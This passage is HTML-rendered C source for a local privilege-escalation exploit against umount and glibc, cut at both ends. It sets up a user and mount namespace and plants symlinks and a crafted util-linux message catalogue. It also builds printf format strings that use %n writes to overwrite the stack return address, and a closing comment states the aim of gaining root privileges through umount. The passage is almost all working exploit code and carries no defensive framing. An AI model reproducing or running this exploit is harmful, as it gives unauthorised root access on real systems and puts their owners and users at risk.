class="number">0x1c</span>;</span><br><span class="line">  *preambleData++=(*(preambleData<span class="number">-2</span>))+(stringCount+<span class="number">1</span>)*<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2</span>;</span><br><span class="line">  *preambleData++=<span class="number">0x5</span>;</span><br><span class="line">  *preambleData++=(*(preambleData<span class="number">-3</span>))+(stringCount+<span class="number">1</span>)*<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *nextCatalogueStringStart=catalogueData+preambleLength;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> stringPos=<span class="number">-1</span>; stringPos&lt;stringCount; stringPos++) &#123;</span><br><span class="line">    <span class="keyword">char</span> *writeString=(stringPos&lt;<span class="number">0</span>)?<span class="string">&quot;&quot;</span>:origStringList[stringPos];</span><br><span class="line">    <span class="keyword">int</span> length=<span class="built_in">strlen</span>(writeString);</span><br><span class="line">    *preambleData++=length;</span><br><span class="line">    *preambleData++=(nextCatalogueStringStart-catalogueData);</span><br><span class="line">    <span class="built_in">memcpy</span>(nextCatalogueStringStart, writeString, length+<span class="number">1</span>);</span><br><span class="line">    nextCatalogueStringStart+=length+<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> stringPos=<span class="number">-1</span>; stringPos&lt;stringCount; stringPos++) &#123;</span><br><span class="line">    <span class="keyword">char</span> *writeString=(stringPos&lt;<span class="number">0</span>)?messageCataloguePreamble:transStringList[stringPos];</span><br><span class="line">    <span class="keyword">int</span> length=<span class="built_in">strlen</span>(writeString);</span><br><span class="line">    *preambleData++=length;</span><br><span class="line">    *preambleData++=(nextCatalogueStringStart-catalogueData);</span><br><span class="line">    <span class="built_in">memcpy</span>(nextCatalogueStringStart, writeString, length+<span class="number">1</span>);</span><br><span class="line">    nextCatalogueStringStart+=length+<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  assert(nextCatalogueStringStart-catalogueData==preambleLength+contentLength);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> stringPos=<span class="number">0</span>; stringPos&lt;=stringCount+<span class="number">1</span>; stringPos++) &#123;</span><br><span class="line"><span class="comment">//    *preambleData++=(stringPos+1);</span></span><br><span class="line">    *preambleData++=(<span class="keyword">int</span>[])&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>&#125;[stringPos];</span><br><span class="line">  &#125;</span><br><span class="line">  *catalogueDataLength=preambleLength+contentLength;</span><br><span class="line">  <span class="keyword">return</span>(catalogueData);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Create the catalogue data from the string lists and write</span></span><br><span class="line"><span class="comment"> *  it to the given file.</span></span><br><span class="line"><span class="comment"> *  @return 0 on success.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writeMessageCatalogue</span><span class="params">(<span class="keyword">char</span> *pathName, <span class="keyword">char</span> **origStringList,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">char</span> **transStringList, <span class="keyword">int</span> stringCount)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> catalogueFd=open(pathName, O_WRONLY|O_CREAT|O_TRUNC|O_NOCTTY, <span class="number">0644</span>);</span><br><span class="line">  <span class="keyword">if</span>(catalogueFd&lt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to open catalogue file %s for writing.\n&quot;</span>,</span><br><span class="line">        pathName);</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> catalogueDataLength;</span><br><span class="line">  <span class="keyword">char</span> *catalogueData=createMessageCatalogueData(</span><br><span class="line">      origStringList, transStringList, stringCount, &amp;catalogueDataLength);</span><br><span class="line">  <span class="keyword">int</span> result=write(catalogueFd, catalogueData, catalogueDataLength);</span><br><span class="line">  assert(result==catalogueDataLength);</span><br><span class="line">  close(catalogueFd);</span><br><span class="line">  <span class="built_in">free</span>(catalogueData);</span><br><span class="line">  <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createDirectoryRecursive</span><span class="params">(<span class="keyword">char</span> *namespaceMountBaseDir, <span class="keyword">char</span> *pathName)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> pathBuffer[PATH_MAX];</span><br><span class="line">  <span class="keyword">int</span> pathNameLength=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">char</span> *nextPathSep=<span class="built_in">strchr</span>(pathName+pathNameLength, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(nextPathSep) &#123;</span><br><span class="line">      pathNameLength=nextPathSep-pathName;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      pathNameLength=<span class="built_in">strlen</span>(pathName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> result=<span class="built_in">snprintf</span>(pathBuffer, <span class="keyword">sizeof</span>(pathBuffer), <span class="string">&quot;%s/%.*s&quot;</span>,</span><br><span class="line">        namespaceMountBaseDir, pathNameLength, pathName);</span><br><span class="line">    assert(result&lt;PATH_MAX);</span><br><span class="line">    result=mkdir(pathBuffer, <span class="number">0755</span>);</span><br><span class="line">    assert((!result)||(errno==EEXIST));</span><br><span class="line">    <span class="keyword">if</span>(!pathName[pathNameLength])</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    pathNameLength++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** This child function prepares the namespaced mount point and</span></span><br><span class="line"><span class="comment"> *  then waits to be killed later on.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">usernsChildFunction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span>(geteuid()!=<span class="number">0</span>) &#123;</span><br><span class="line">    sched_yield();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> result=mount(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/tmp&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, MS_MGC_VAL, <span class="literal">NULL</span>);</span><br><span class="line">  assert(!result);</span><br><span class="line">  assert(!chdir(<span class="string">&quot;/tmp&quot;</span>));</span><br><span class="line">  <span class="keyword">int</span> handle=open(<span class="string">&quot;ready&quot;</span>, O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY, <span class="number">0644</span>);</span><br><span class="line">  assert(handle&gt;=<span class="number">0</span>);</span><br><span class="line">  close(handle);</span><br><span class="line">  sleep(<span class="number">100000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Prepare a process living in an own mount namespace and setup</span></span><br><span class="line"><span class="comment"> *  the mount structure appropriately. The process is created</span></span><br><span class="line"><span class="comment"> *  in a way allowing cleanup at program end by just killing it,</span></span><br><span class="line"><span class="comment"> *  thus removing the namespace.</span></span><br><span class="line"><span class="comment"> *  @return the pid of that process or -1 on error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">prepareNamespacedProcess</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(namespacedProcessPid==<span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;No pid supplied via command line, trying to create a namespace\nCAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *stackData=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">1</span>&lt;&lt;<span class="number">20</span>);</span><br><span class="line">    assert(stackData);</span><br><span class="line">    namespacedProcessPid=clone(usernsChildFunction, stackData+(<span class="number">1</span>&lt;&lt;<span class="number">20</span>),</span><br><span class="line">        CLONE_NEWUSER|CLONE_NEWNS|SIGCHLD, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(namespacedProcessPid==<span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;USERNS clone failed: %d (%s)\n&quot;</span>, errno, strerror(errno));</span><br><span class="line">      <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> idMapFileName[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">char</span> idMapData[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(idMapFileName, <span class="string">&quot;/proc/%d/setgroups&quot;</span>, namespacedProcessPid);</span><br><span class="line">    <span class="keyword">int</span> setGroupsFd=open(idMapFileName, O_WRONLY);</span><br><span class="line">    assert(setGroupsFd&gt;=<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> result=write(setGroupsFd, <span class="string">&quot;deny&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    assert(result&gt;<span class="number">0</span>);</span><br><span class="line">    close(setGroupsFd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(idMapFileName, <span class="string">&quot;/proc/%d/uid_map&quot;</span>, namespacedProcessPid);</span><br><span class="line">    <span class="keyword">int</span> uidMapFd=open(idMapFileName, O_WRONLY);</span><br><span class="line">    assert(uidMapFd&gt;=<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(idMapData, <span class="string">&quot;0 %d 1\n&quot;</span>, getuid());</span><br><span class="line">    result=write(uidMapFd, idMapData, <span class="built_in">strlen</span>(idMapData));</span><br><span class="line">    assert(result&gt;<span class="number">0</span>);</span><br><span class="line">    close(uidMapFd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(idMapFileName, <span class="string">&quot;/proc/%d/gid_map&quot;</span>, namespacedProcessPid);</span><br><span class="line">    <span class="keyword">int</span> gidMapFd=open(idMapFileName, O_WRONLY);</span><br><span class="line">    assert(gidMapFd&gt;=<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(idMapData, <span class="string">&quot;0 %d 1\n&quot;</span>, getgid());</span><br><span class="line">    result=write(gidMapFd, idMapData, <span class="built_in">strlen</span>(idMapData));</span><br><span class="line">    assert(result&gt;<span class="number">0</span>);</span><br><span class="line">    close(gidMapFd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// After setting the maps for the child process, the child may</span></span><br><span class="line"><span class="comment">// start setting up the mount point. Wait for that to complete.</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Namespaced filesystem created with pid %d\n&quot;</span>,</span><br><span class="line">        namespacedProcessPid);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  osReleaseExploitData=osSpecificExploitDataList;</span><br><span class="line">  <span class="keyword">if</span>(osRelease) &#123;</span><br><span class="line"><span class="comment">// If an OS was detected, try to find it in list. Otherwise use</span></span><br><span class="line"><span class="comment">// default.</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> tPos=<span class="number">0</span>; osSpecificExploitDataList[tPos]; tPos+=<span class="number">4</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(osSpecificExploitDataList[tPos], osRelease)) &#123;</span><br><span class="line">        osReleaseExploitData=osSpecificExploitDataList+tPos;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> pathBuffer[PATH_MAX];</span><br><span class="line">  <span class="keyword">int</span> result=<span class="built_in">snprintf</span>(pathBuffer, <span class="keyword">sizeof</span>(pathBuffer), <span class="string">&quot;/proc/%d/cwd&quot;</span>,</span><br><span class="line">     namespacedProcessPid);</span><br><span class="line">  assert(result&lt;PATH_MAX);</span><br><span class="line">  <span class="keyword">char</span> *namespaceMountBaseDir=strdup(pathBuffer);</span><br><span class="line">  assert(namespaceMountBaseDir);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create directories needed for umount to proceed to final state</span></span><br><span class="line"><span class="comment">// &quot;not mounted&quot;.</span></span><br><span class="line">  createDirectoryRecursive(namespaceMountBaseDir, <span class="string">&quot;(unreachable)/x&quot;</span>);</span><br><span class="line">  result=<span class="built_in">snprintf</span>(pathBuffer, <span class="keyword">sizeof</span>(pathBuffer),</span><br><span class="line">      <span class="string">&quot;(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES&quot;</span>, osReleaseExploitData[<span class="number">2</span>]);</span><br><span class="line">  assert(result&lt;PATH_MAX);</span><br><span class="line">  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);</span><br><span class="line">  result=<span class="built_in">snprintf</span>(pathBuffer, <span class="keyword">sizeof</span>(pathBuffer),</span><br><span class="line">      <span class="string">&quot;(unreachable)/tmp/%s/X.X/LC_MESSAGES&quot;</span>, osReleaseExploitData[<span class="number">2</span>]);</span><br><span class="line">  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);</span><br><span class="line">  result=<span class="built_in">snprintf</span>(pathBuffer, <span class="keyword">sizeof</span>(pathBuffer),</span><br><span class="line">      <span class="string">&quot;(unreachable)/tmp/%s/X.x/LC_MESSAGES&quot;</span>, osReleaseExploitData[<span class="number">2</span>]);</span><br><span class="line">  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create symlink to trigger underflows.</span></span><br><span class="line">  result=<span class="built_in">snprintf</span>(pathBuffer, <span class="keyword">sizeof</span>(pathBuffer), <span class="string">&quot;%s/(unreachable)/tmp/down&quot;</span>,</span><br><span class="line">      namespaceMountBaseDir);</span><br><span class="line">  assert(result&lt;PATH_MAX);</span><br><span class="line">  result=symlink(osReleaseExploitData[<span class="number">1</span>], pathBuffer);</span><br><span class="line">  assert(!result||(errno==EEXIST));</span><br><span class="line"></span><br><span class="line"><span class="comment">// getdate will leave that string in rdi to become the filename</span></span><br><span class="line"><span class="comment">// to execute for the next round.</span></span><br><span class="line">  <span class="keyword">char</span> *selfPathName=realpath(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">  result=<span class="built_in">snprintf</span>(pathBuffer, <span class="keyword">sizeof</span>(pathBuffer), <span class="string">&quot;%s/DATEMSK&quot;</span>,</span><br><span class="line">      namespaceMountBaseDir);</span><br><span class="line">  assert(result&lt;PATH_MAX);</span><br><span class="line">  <span class="keyword">int</span> handle=open(pathBuffer, O_WRONLY|O_CREAT|O_TRUNC, <span class="number">0755</span>);</span><br><span class="line">  assert(handle&gt;<span class="number">0</span>);</span><br><span class="line">  result=<span class="built_in">snprintf</span>(pathBuffer, <span class="keyword">sizeof</span>(pathBuffer), <span class="string">&quot;#!%s\nunused&quot;</span>,</span><br><span class="line">      selfPathName);</span><br><span class="line">  assert(result&lt;PATH_MAX);</span><br><span class="line">  result=write(handle, pathBuffer, result);</span><br><span class="line">  close(handle);</span><br><span class="line">  <span class="built_in">free</span>(selfPathName);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write the initial message catalogue to trigger stack dumping</span></span><br><span class="line"><span class="comment">// and to make the &quot;umount&quot; call privileged by toggling the &quot;restricted&quot;</span></span><br><span class="line"><span class="comment">// flag in the context.</span></span><br><span class="line">  result=<span class="built_in">snprintf</span>(pathBuffer, <span class="keyword">sizeof</span>(pathBuffer),</span><br><span class="line">      <span class="string">&quot;%s/(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES/util-linux.mo&quot;</span>,</span><br><span class="line">      namespaceMountBaseDir, osReleaseExploitData[<span class="number">2</span>]);</span><br><span class="line">  assert(result&lt;PATH_MAX);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *stackDumpStr=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x80</span>+<span class="number">6</span>*(STACK_LONG_DUMP_BYTES/<span class="number">8</span>));</span><br><span class="line">  assert(stackDumpStr);</span><br><span class="line">  <span class="keyword">char</span> *stackDumpStrEnd=stackDumpStr;</span><br><span class="line">  stackDumpStrEnd+=<span class="built_in">sprintf</span>(stackDumpStrEnd, <span class="string">&quot;AA%%%d$lnAAAAAA&quot;</span>,</span><br><span class="line">      ((<span class="keyword">int</span>*)osReleaseExploitData[<span class="number">3</span>])[ED_STACK_OFFSET_CTX]);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> dumpCount=(STACK_LONG_DUMP_BYTES/<span class="number">8</span>); dumpCount; dumpCount--) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(stackDumpStrEnd, <span class="string">&quot;%016lx&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    stackDumpStrEnd+=<span class="number">6</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// We wrote allready 8 bytes, write so many more to produce a</span></span><br><span class="line"><span class="comment">// count of &#x27;L&#x27; and write that to the stack. As all writes so</span></span><br><span class="line"><span class="comment">// sum up to a count aligned by 8, and &#x27;L&#x27;==0x4c, we will have</span></span><br><span class="line"><span class="comment">// to write at least 4 bytes, which is longer than any &quot;%hhx&quot;</span></span><br><span class="line"><span class="comment">// format string output. Hence do not care about the byte content</span></span><br><span class="line"><span class="comment">// here. The target write address has a 16 byte alignment due</span></span><br><span class="line"><span class="comment">// to varg structure.</span></span><br><span class="line">  stackDumpStrEnd+=<span class="built_in">sprintf</span>(stackDumpStrEnd, <span class="string">&quot;%%1$%dhhx%%%d$hhn&quot;</span>,</span><br><span class="line">      (<span class="string">&#x27;L&#x27;</span><span class="number">-8</span>-STACK_LONG_DUMP_BYTES*<span class="number">2</span>)&amp;<span class="number">0xff</span>,</span><br><span class="line">      STACK_LONG_DUMP_BYTES/<span class="number">16</span>);</span><br><span class="line">  *stackDumpStrEnd=<span class="number">0</span>;</span><br><span class="line">  result=writeMessageCatalogue(pathBuffer,</span><br><span class="line">      (<span class="keyword">char</span>*[])&#123;</span><br><span class="line">          <span class="string">&quot;%s: mountpoint not found&quot;</span>,</span><br><span class="line">          <span class="string">&quot;%s: not mounted&quot;</span>,</span><br><span class="line">          <span class="string">&quot;%s: target is busy\n        (In some cases useful info about processes that\n         use the device is found by lsof(8) or fuser(1).)&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      (<span class="keyword">char</span>*[])&#123;<span class="string">&quot;1234&quot;</span>, stackDumpStr, <span class="string">&quot;5678&quot;</span>&#125;,</span><br><span class="line">      <span class="number">3</span>);</span><br><span class="line">  assert(!result);</span><br><span class="line">  <span class="built_in">free</span>(stackDumpStr);</span><br><span class="line"></span><br><span class="line">  result=<span class="built_in">snprintf</span>(pathBuffer, <span class="keyword">sizeof</span>(pathBuffer),</span><br><span class="line">      <span class="string">&quot;%s/(unreachable)/tmp/%s/X.X/LC_MESSAGES/util-linux.mo&quot;</span>,</span><br><span class="line">      namespaceMountBaseDir, osReleaseExploitData[<span class="number">2</span>]);</span><br><span class="line">  assert(result&lt;PATH_MAX);</span><br><span class="line">  result=mknod(pathBuffer, S_IFIFO|<span class="number">0666</span>, S_IFIFO);</span><br><span class="line">  assert((!result)||(errno==EEXIST));</span><br><span class="line">  secondPhaseTriggerPipePathname=strdup(pathBuffer);</span><br><span class="line"></span><br><span class="line">  result=<span class="built_in">snprintf</span>(pathBuffer, <span class="keyword">sizeof</span>(pathBuffer),</span><br><span class="line">      <span class="string">&quot;%s/(unreachable)/tmp/%s/X.x/LC_MESSAGES/util-linux.mo&quot;</span>,</span><br><span class="line">      namespaceMountBaseDir, osReleaseExploitData[<span class="number">2</span>]);</span><br><span class="line">  secondPhaseCataloguePathname=strdup(pathBuffer);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(namespaceMountBaseDir);</span><br><span class="line">  <span class="keyword">return</span>(namespacedProcessPid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Create the format string to write an arbitrary value to the</span></span><br><span class="line"><span class="comment"> *  stack. The created format string avoids to interfere with</span></span><br><span class="line"><span class="comment"> *  the complex fprintf format handling logic by accessing fprintf</span></span><br><span class="line"><span class="comment"> *  internal state on stack. Thus the modification method does</span></span><br><span class="line"><span class="comment"> *  not depend on that ftp internals. The current libc fprintf</span></span><br><span class="line"><span class="comment"> *  implementation copies values for formatting before applying</span></span><br><span class="line"><span class="comment"> *  the %n writes, therefore pointers changed by fprintf operation</span></span><br><span class="line"><span class="comment"> *  can only be utilized with the next fprintf invocation. As</span></span><br><span class="line"><span class="comment"> *  we cannot rely on a stack having a suitable number of pointers</span></span><br><span class="line"><span class="comment"> *  ready for arbitrary writes, we need to create those pointers</span></span><br><span class="line"><span class="comment"> *  one by one. Everything needed is pointer on stack pointing</span></span><br><span class="line"><span class="comment"> *  to another valid pointer and 4 helper pointers pointing to</span></span><br><span class="line"><span class="comment"> *  writeable memory. The **argv list matches all those requirements.</span></span><br><span class="line"><span class="comment"> *  @param printfArgvValuePos the position of the argv pointer from</span></span><br><span class="line"><span class="comment"> *  printf format string view.</span></span><br><span class="line"><span class="comment"> *  @param argvStackAddress the address of the argv list, where</span></span><br><span class="line"><span class="comment"> *  the argv[0] pointer can be read.</span></span><br><span class="line"><span class="comment"> *  @param printfArg0ValuePos the position of argv list containing</span></span><br><span class="line"><span class="comment"> *  argv[0..n] pointers.</span></span><br><span class="line"><span class="comment"> *  @param mainFunctionReturnAddress the address on stack where</span></span><br><span class="line"><span class="comment"> *  the return address from the main() function to _libc_start()</span></span><br><span class="line"><span class="comment"> *  is stored.</span></span><br><span class="line"><span class="comment"> *  @param writeValue the value to write to mainFunctionReturnAddress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createStackWriteFormatString</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">char</span> *formatBuffer, <span class="keyword">int</span> bufferSize, <span class="keyword">int</span> printfArgvValuePos,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span> *argvStackAddress, <span class="keyword">int</span> printfArg0ValuePos,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span> *mainFunctionReturnAddress, <span class="keyword">unsigned</span> <span class="keyword">short</span> *writeData,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">int</span> writeDataLength)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> currentValue=<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> nextWriteValue=<span class="number">0</span>; nextWriteValue&lt;<span class="number">0x10000</span>;) &#123;</span><br><span class="line"><span class="comment">// Find the lowest value to write.</span></span><br><span class="line">    nextWriteValue=<span class="number">0x10000</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> valuePos=<span class="number">0</span>; valuePos&lt;writeDataLength; valuePos++) &#123;</span><br><span class="line">       <span class="keyword">int</span> value=writeData[valuePos];</span><br><span class="line">       <span class="keyword">if</span>((value&gt;currentValue)&amp;&amp;(value&lt;nextWriteValue))</span><br><span class="line">         nextWriteValue=value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(currentValue&lt;<span class="number">0</span>)</span><br><span class="line">      currentValue=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(currentValue!=nextWriteValue) &#123;</span><br><span class="line">      result=<span class="built_in">snprintf</span>(formatBuffer, bufferSize, <span class="string">&quot;%%1$%1$d.%1$ds&quot;</span>,</span><br><span class="line">          nextWriteValue-currentValue);</span><br><span class="line">      formatBuffer+=result;</span><br><span class="line">      bufferSize-=result;</span><br><span class="line">      currentValue=nextWriteValue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> valuePos=<span class="number">0</span>; valuePos&lt;writeDataLength; valuePos++) &#123;</span><br><span class="line">       <span class="keyword">if</span>(writeData[valuePos]==nextWriteValue) &#123;</span><br><span class="line">          result=<span class="built_in">snprintf</span>(formatBuffer, bufferSize,</span><br><span class="line">              <span class="string">&quot;%%%d$hn&quot;</span>, printfArg0ValuePos+valuePos+<span class="number">1</span>);</span><br><span class="line">          formatBuffer+=result;</span><br><span class="line">          bufferSize-=result;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Print the return function address location number of bytes</span></span><br><span class="line"><span class="comment">// except 8 (those from the LABEL counter) and write the value</span></span><br><span class="line"><span class="comment">// to arg1.</span></span><br><span class="line">  <span class="keyword">int</span> writeCount=((<span class="keyword">int</span>)mainFunctionReturnAddress<span class="number">-18</span>)&amp;<span class="number">0xffff</span>;</span><br><span class="line">  result=<span class="built_in">snprintf</span>(formatBuffer, bufferSize,</span><br><span class="line">      <span class="string">&quot;%%1$%d.%ds%%1$s%%1$s%%%d$hn&quot;</span>,</span><br><span class="line">      writeCount, writeCount, printfArg0ValuePos);</span><br><span class="line">  formatBuffer+=result;</span><br><span class="line">  bufferSize-=result;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write the LABEL 6 more times, thus multiplying the the single</span></span><br><span class="line"><span class="comment">// byte write pointer to an 8-byte aligned argv-list pointer and</span></span><br><span class="line"><span class="comment">// update argv[0] to point to argv[1..n].</span></span><br><span class="line">  writeCount=(((<span class="keyword">int</span>)argvStackAddress)-(writeCount+<span class="number">56</span>))&amp;<span class="number">0xffff</span>;</span><br><span class="line">  result=<span class="built_in">snprintf</span>(formatBuffer, bufferSize,</span><br><span class="line">      <span class="string">&quot;%%1$s%%1$s%%1$s%%1$s%%1$s%%1$s%%1$%d.%ds%%%d$hn&quot;</span>,</span><br><span class="line">      writeCount, writeCount, printfArgvValuePos);</span><br><span class="line">  formatBuffer+=result;</span><br><span class="line">  bufferSize-=result;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Append a debugging preamble.</span></span><br><span class="line">  result=<span class="built_in">snprintf</span>(formatBuffer, bufferSize, <span class="string">&quot;-%%35$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%78$s\n&quot;</span>,</span><br><span class="line">      printfArgvValuePos, printfArg0ValuePos<span class="number">-1</span>, printfArg0ValuePos,</span><br><span class="line">      printfArg0ValuePos+<span class="number">1</span>, printfArg0ValuePos+<span class="number">2</span>, printfArg0ValuePos+<span class="number">3</span>,</span><br><span class="line">      printfArg0ValuePos+<span class="number">4</span>, printfArg0ValuePos+<span class="number">5</span>, printfArg0ValuePos+<span class="number">6</span>);</span><br><span class="line">  formatBuffer+=result;</span><br><span class="line">  bufferSize-=result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Wait for the trigger pipe to open. The pipe will be closed</span></span><br><span class="line"><span class="comment"> *  immediately after opening it.</span></span><br><span class="line"><span class="comment"> *  @return 0 when the pipe was opened before hitting a timeout.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">waitForTriggerPipeOpen</span><span class="params">(<span class="keyword">char</span> *pipeName)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">startTime</span>, <span class="title">currentTime</span>;</span></span><br><span class="line">  <span class="keyword">int</span> result=clock_gettime(CLOCK_MONOTONIC, &amp;startTime);</span><br><span class="line">  startTime.tv_sec+=<span class="number">10</span>;</span><br><span class="line">  assert(!result);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> pipeFd=open(pipeName, O_WRONLY|O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span>(pipeFd&gt;=<span class="number">0</span>) &#123;</span><br><span class="line">      close(pipeFd);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    result=clock_gettime(CLOCK_MONOTONIC, &amp;currentTime);</span><br><span class="line">    <span class="keyword">if</span>(currentTime.tv_sec&gt;startTime.tv_sec) &#123;</span><br><span class="line">      <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    currentTime.tv_sec=<span class="number">0</span>;</span><br><span class="line">    currentTime.tv_nsec=<span class="number">100000000</span>;</span><br><span class="line">    nanosleep(&amp;currentTime, <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Invoke umount to gain root privileges.</span></span><br><span class="line"><span class="comment"> *  @return 0 if the umount process terminated with expected exit</span></span><br><span class="line"><span class="comment"> *  